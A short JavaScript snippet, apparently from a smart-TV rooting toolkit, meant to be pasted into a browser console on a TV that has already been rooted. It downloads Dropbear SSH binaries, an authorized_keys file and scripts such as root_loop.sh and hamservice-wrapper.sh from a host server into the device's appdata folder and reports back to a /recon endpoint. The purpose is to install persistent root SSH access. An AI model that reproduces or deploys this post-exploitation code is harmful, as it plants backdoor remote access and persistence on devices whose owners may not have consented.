// upload_to_appdata.js — paste into the TV recon page console (after root).
// Downloads the SSH/Dropbear deploy files from the host server into
// /3rd_rw/appdata so deploy_sshd.sh can install them.
(function(){
  var files = [
    "dropbear",
    "dropbear-sftp",
    "dropbearkey",
    "sftp-server",
    "authorized_keys",
    "start_sshd.sh",
    "root_loop.sh",
    "hamservice-wrapper.sh",
    "deploy_sshd.sh",
    "verify.sh",
    "rollback.sh"
  ];
  var o = {};
  for (var i = 0; i < files.length; i++) {
    o[files[i]] = HiBrowser.File.download(location.origin + "/pub/" + files[i],
                                          files[i], 1);
  }
  fetch("/recon", {method:"POST", body:"UPLOAD "+JSON.stringify(o)});
  return o;
})();
